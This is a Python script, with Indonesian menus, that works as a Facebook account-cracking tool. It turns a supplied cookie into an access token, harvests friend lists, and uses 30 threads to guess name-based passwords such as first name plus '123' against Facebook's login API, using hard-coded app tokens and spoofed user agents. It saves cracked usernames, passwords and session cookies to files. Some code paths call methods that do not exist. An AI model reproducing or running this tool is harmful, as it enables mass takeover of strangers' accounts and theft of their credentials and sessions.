import os,sys,re,time,requests,random,bs4,json,time
from concurrent.futures import ThreadPoolExecutor
from bs4 import BeautifulSoup as parser
from datetime import date,datetime
ses=requests.Session()

M = "\x1b[1;91m" # MERAH
H = "\x1b[1;92m" # HIJAU
K = "\x1b[1;93m" # KUNING
N = "\x1b[0m"	# WARNA MATI
tampung = []
idz = []
ugent = []
prox = []
usragent = []
ugen2 = []
	
def usera():
	versi_android = random.randint(4,12)
	versi_chrome = str(random.randint(300,325))+".0.0."+str(random.randint(1,8))+"."+str(random.randint(40,150))
	versi_app = random.randint(410000000,499999999)
	build = random.choice(["SP1A.210812.016","TP1A.220905.001","SP1A.210812.016","SP1A.210812.016","TP1A.220905.001","TP1A.220905.001","SP1A.210812.016","RKQ1.210503.001","TP1A.220905.001","RKQ1.211119.001","TP1A.220905.001","TP1A.220905.001","RP1A.201005.001","RP1A.201005.001","RKQ1.211119.001"])
	realme = random.choice(['RMX2200','RMX3300','RMX3571','RMX3311','RMP2107','RMX3571','RMX3357','RMX3461','RMX3478'])
	samsung = random.choice(["GT-1015","GT-1020","GT-1030","GT-1035","GT-1040","GT-1045","GT-1050","GT-1240","GT-1440","GT-1450","GT-18190","GT-18262","GT-19060I","GT-19082","GT-19083","GT-19105","GT-19152","GT-19192","GT-19300","GT-19505","GT-2000","GT-20000","GT-200s","GT-3000","GT-414XOP","GT-6918","GT-7010","GT-7020","GT-7030","GT-7040","GT-7050","GT-7100","GT-7105","GT-7110","GT-7205","GT-7210","GT-7240R","GT-7245","GT-7303","GT-7310","GT-7320","GT-7325","GT-7326","GT-7340","GT-7405","GT-7550 5GT-8005","GT-8010","GT-81","GT-810","GT-8105","GT-8110","GT-8220S","GT-8410","GT-9300","GT-9320","GT-93G","GT-A7100","GT-A9500","GT-ANDROID","GT-B2710","GT-B5330","GT-B5330B","GT-B5330L","GT-B5330ZKAINU","GT-B5510","GT-B5512","GT-B5722","GT-B7510","GT-B7722","GT-B7810","GT-B9150","GT-B9388","GT-C3010","GT-C3262","GT-C3310R","GT-C3312","GT-C3312R","GT-C3313T","GT-C3322","GT-C3322i","GT-C3520","GT-C3520I","GT-C3592","GT-C3595","GT-C3782","GT-C6712","GT-E1282T","GT-E1500","GT-E2200","GT-E2202","GT-E2250","GT-E2252","GT-E2600","GT-E2652W","GT-E3210","GT-E3309","GT-E3309I","GT-E3309T","GT-G530H","GT-G930F","GT-H9500","GT-I5508","GT-I5801","GT-I6410","GT-I8150","GT-I8160OKLTPA","GT-I8160ZWLTTT","GT-I8258","GT-I8262D","GT-I8268""GT-I8505","GT-I8530BAABTU","GT-I8530BALCHO","GT-I8530BALTTT","GT-I8550E","GT-I8750","GT-I900","GT-I9008L","GT-I9080E","GT-I9082C","GT-I9082EWAINU","GT-I9082i","GT-I9100G","GT-I9100LKLCHT","GT-I9100M","GT-I9100P","GT-I9100T","GT-I9105UANDBT","GT-I9128E","GT-I9128I","GT-I9128V","GT-I9158P","GT-I9158V","GT-I9168I","GT-I9190","GT-I9192","GT-I9192I","GT-I9195H"])
	ua_realme = f"Mozilla/5.0 (Linux; U; Android 12; zh-cn; M2102K1C Build/SKQ1.211006.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/100.0.4896.127 Mobile Safari/537.36]"
	ua_samsung = f"Dalvik/2.1.0 (Linux; U; Android {versi_android}; {samsung} Build/{build}) [FBAN/MessengerLite;FBAV/{versi_chrome};FBPN/com.facebook.mlite;FBLC/in_ID;FBBV/{versi_app};FBCR/Indosat Ooredoo;FBMF/Samsung;FBBD/Samsung;FBDV/{samsung};FBSV/{versi_android};FBCA/arm64-v8a:null;FBDM/"+"{density=2.0,width=720,height=1412};]"
	return random.choice([ua_realme,ua_samsung])
	
class Main:
	
	def __init__(self):
		self.memek = []
		self.ip = ses.get("http://ip-api.com/json/").json()["query"]
		self.hari_ini = datetime.now().strftime("%d %B %Y")
		
	def logo(self):
		os.system("clear")
		print(f"""{N}
                     _____         _____ ______  \n    ______ _________ ___(_)        __  /____  /_ \n    _  __ `/___  __ \__  / _________  __/__  __ \.\n    / /_/ / __  /_/ /_  /  _/_____// /_  _  /_/ /\n    \__,_/  _  .___/ /_/           \__/  /_.___/ \n            /_/ KaneShiro     
                                     """)
      
	def login(self):
		self.logo()
		self.url = "https://mbasic.facebook.com"
		self.ses=requests.Session()
		cok = input(" [*] masukan cookie : ")
		try:
			data, data2 = {}, {}
			link = self.ses.post("https://graph.facebook.com/v16.0/device/login/", data={"access_token": "661587963994814|ffe07cc864fd1dc8fe386229dcb7a05e", "scope": ""}).json()
			kode = link["code"];user = link["user_code"]
			print(link)
			vers = parser(self.ses.get(f"{self.url}/device", cookies={"cookie": cok}).content, "html.parser")
			item = ["fb_dtsg","jazoest","qr"]
			for x in vers.find_all("input"):
				if x.get("name") in item:
					aset = {x.get("name"):x.get("value")}
					data.update(aset)
			data.update({"user_code":user})
			print(data)
			meta = parser(self.ses.post(self.url+vers.find("form", method="post").get("action"), data=data, cookies={"cookie": cok}).text, "html.parser")
			xzxz  = meta.find("form",{"method":"post"})
			for x in xzxz("input",{"value":True}):
				try:
					if x["name"] == "__CANCEL__" : pass
					else:data2.update({x['name']:x['value']})
				except Exception as e: pass
			print(data2)
			self.ses.post(f"{self.url}{xzxz['action']}", data=data2, cookies={"cookie":cok})
			tokz = self.ses.get(f"https://graph.facebook.com/v16.0/device/login_status?method=post&code={kode}&access_token=661587963994814|ffe07cc864fd1dc8fe386229dcb7a05e").json()
			ff = (tokz["access_token"])
			open('cookie.txt','w').write(cok)
			open('token.txt','w').write(tokz["access_token"])
			exit()
			print(" [*] jalankan ulang script")
		except Exception as e:exit(e)

	def menu(self):
		try:
			token = open("token.txt","r").read()
			cok = open("cookie.txt","r").read()
			cookie = {"cookie":cok}
			nama = ses.get(f"https://graph.facebook.com/me?access_token={token}",cookies=cookie).json()["name"]
		except:
			try:os.remove("cookie.txt")
			except:pass
			try:os.remove("token.txt")
			except:pass
			self.login()
		self.logo()
		print(f"{N} [*] Bergabung   : {self.hari_ini}")
		print(f" [*] Status      : {H}Premium{N}")
		print(" [*] ---------------------------------------------")
		print(f" [*] IP          : {self.ip}\n")
		print(" [01]. crack dari file")
		print(" [02]. crack dari id publik")
		print(" [03]. lihat akun hasil crack")
		print(f" [{M}00{N}]. logout (hapus login)")
		ask = input("\n [?] pilih : ")
		if ask in["1","01"]:
			fol = input("\n [*] masukan nama file : ")
			file = open(f"{fol}","r").read().splitlines()
			for z in file:
				idz.append(z)
			Crack().atursandi()
		elif ask in["2","02"]:
			print (" [*] isi 'me' jika ingin crack dari daftar teman")
			user = input(" [*] masukan id atau username : ")
			self.publik(user,token,cookie)
			Crack().atursandi()
		elif ask in["0","00"]:
			try:os.remove("cookie.txt")
			except:pass
			try:os.remove("token.txt")
			except:pass
			exit(" [+] berhasil menghapus login")
		
	def publik(self,user,token,cookie):
		try:
			url = ses.get(f"https://graph.facebook.com/v1.0/{user}?fields=friends.limit(5000)&access_token={token}",cookies=cookie)
			jason = json.loads(url.text)
			for i in jason["friends"]["data"]:
				idz.append(i["id"]+"<=>"+i["name"])
				sys.stdout.write(f"\r [*] sedang mengumpulkan {len(idz)} id....");sys.stdout.flush()
		except Exception as e:
			print(e)
		
class Crack:
	
	def __init__(self):
		self.loop = 0
		self.ok = []
		self.cp = []
		self.mtd = []
		self.hari_ini = datetime.now().strftime("%A-%d-%B-%Y")+".txt"
		
	def atursandi(self):
		print(f"\n\n [+] total id -> {M}{len(idz)}{N}")
		ask = input(" [?] apakah anda ingin menggunakan sandi manual? [Y/t]:")
		print("\n [ pilih method login - silahkan coba satu² ]\n")
		print(" [1]. method api")
		print(" [2]. method mobile")
		method = input("\n [?] method : ")
		if method in["1","01"]:
			self.mtd.append("api")
		elif method in["2","02"]:
			self.mtd.append("api")
		elif method in["3","03"]:
			self.mtd.append("mobile")
		for urutan in idz:
			xx = random.randint(0,len(tampung))
			tampung.insert(xx,urutan)
		if ask in["y","Y"]:
			print ("\n [!] gunakan , (koma) untuk pemisah contoh : sandi123,sandi12345,dll. setiap kata minimal 6 karakter atau lebih")
			pwx = input("\n [?] masukan kata sandi : ")
			if len(pwx) < 6:
				exit(" [!] kata sandi minimal 6 karakter")
			print(f" [*] crack dengan sandi -> [{M}{','.join(x for x in pwx.split(','))}{N}]")
			self.manual(pwx)
		else:
			self.otomatis()
		
	def manual(self,pw):
		with ThreadPoolExecutor(max_workers=30) as fall:
			self.simpan_hasil()
			for data in tampung:
				try:
					pwx = []
					user = data.split("<=>")[0]
					for x in pw.split(","):
						pwx.append(x)
					if "api" in self.mtd:
						fall.submit(self.metode_api,user,pwx)
					elif "mbasic" in self.mtd:
						fall.submit(self.metode_reguvali,user,pwx,url)
					elif "mobile" in self.mtd:
						fall.submit(self.metode_messenger,user,pwx)
				except:
					if "api" in self.mtd:
						fall.submit(self.metode_api,user,pwx,url)
					elif "reguvali" in self.mtd:
						fall.submit(self.metode_reguvali,user,pwx,url)
					elif "messenger" in self.mtd:
						fall.submit(self.metode_messenger,user,pwx)

	def otomatis(self):
		with ThreadPoolExecutor(max_workers=30) as fall:
			self.simpan_hasil()
			for data in tampung:
				try:
					pwx = []
					user = data.split("<=>")[0]
					nama = data.split("<=>")[1]
					depan = nama.split(" ")[0]
					if len(nama)<=5:
						if len(depan)<3:
							pass 
						else:
							pwx.append(depan+"123")
							pwx.append(depan+"12345")
					else:
						if len(depan)<3:
							pwx.append(nama)
						else:
							pwx.append(nama)
							pwx.append(depan+"123")
							pwx.append(depan+"12345")
						belakang = nama.split(" ")[1]
						if len(belakang)<3:
							pwx.append(depan+belakang)
						else:
							pwx.append(depan+belakang)
							pwx.append(belakang+"123")
							pwx.append(belakang+"12345")
					if "api" in self.mtd:
						fall.submit(self.metode_api,user,pwx)
					elif "mbasic" in self.mtd:
						fall.submit(self.metode_aplikasi,user,pwx,"m.facebook.com")
					elif "mobile" in self.mtd:
						fall.submit(self.metode_aplikasi,user,pwx,"m.facebook.com")
				except:
					if "api" in self.mtd:
						fall.submit(self.metode_api,user,pwx)
					elif "mbasic" in self.mtd:
						fall.submit(self.metode_aplikasi,user,pwx)
					elif "mobile" in self.mtd:
						fall.submit(self.metode_aplikasi,user,pwx,"m.facebook.com")
		exit("\n\n [#] crack selesai....")
	
	def metode_api(self,user,pwx):
		sys.stdout.write(f"\r {N}[*] [crack] {self.loop}/{len(tampung)}  OK : {len(self.ok)} - CP : {len(self.cp)} "),
		sys.stdout.flush()
		for pw in pwx:
			try:
				pw = pw.lower()
				ua = usera()
				#ua = "Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-J320F Build/LMY47V) [FBAN/FB4A;FBAV/43.0.0.29.147;FBPN/com.facebook.katana;FBLC/en_GB;FBBV/14274161;FBCR/Tele2 LT;FBMF/samsung;FBBD/samsung;FBDV/SM-J320F;FBSV/5.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]"
				ses = requests.Session()
				params = {"access_token": "200424423651082|2a9918c6bcd75b94cefcbb5635c6ad16","sdk_version": f"{str(random.randint(1,26))}", "email": user,"locale": "ja_JP","password": pw,"sdk": "android","generate_session_cookies": "1","sig": "4f648f21fb58fcd2aa1c65f35f441ef5"}
				headers = {"Host": "graph.facebook.com", "x-fb-connection-bandwidth": str(random.randint(20000000, 30000000)),"x-fb-sim-hni": str(random.randint(20000, 40000)),"x-fb-net-hni": str(random.randint(20000, 40000)),"x-fb-connection-quality": "EXCELLENT","user-agent": ua,"content-type": "application/x-www-form-urlencoded","x-fb-http-engine": "Liger"}
				post = ses.post("https://graph.facebook.com/auth/login",params=params, headers=headers, allow_redirects=False)
				if "session_key" in post.text and "EAA" in post.text:
					self.ok.append(user)
					cookie = ";".join(i["name"]+"="+i["value"] for i in post.json()["session_cookies"])
					print(f"\r  {H}* -----> {user}|{pw}|{cookie}                ")
					open(f"OK/{self.hari_ini}","a").write(f"  * --> {user}|{pw}|{cookie}\n")
				elif "User must verify their account on www.facebook.com" in post.json()["error"]["message"] or "User must verify their account" in post.text:
					self.cp.append(user)
					print(f"\r  {K}* -----> {user}|{pw}                  ")
					open(f"CP/{self.hari_ini}","a").write(f"  * --> {user}|{pw}\n")
			except requests.exceptions.ConnectionError:time.sleep(30)
			#except Exception as e:print(e)
		self.loop+=1
		
					
	def simpan_hasil(self):
		print(f"\n [+] hasil OK disimpan ke : OK/{self.hari_ini}")
		print(f" [+] hasil CP disimpan ke : CP/{self.hari_ini}")
		print("\n [!] anda bisa mematikan data selular untuk menjeda proses crack\n")
		
if __name__=="__main__":
	#generate_ugent()
	#print(generate_air())
	Main().menu()
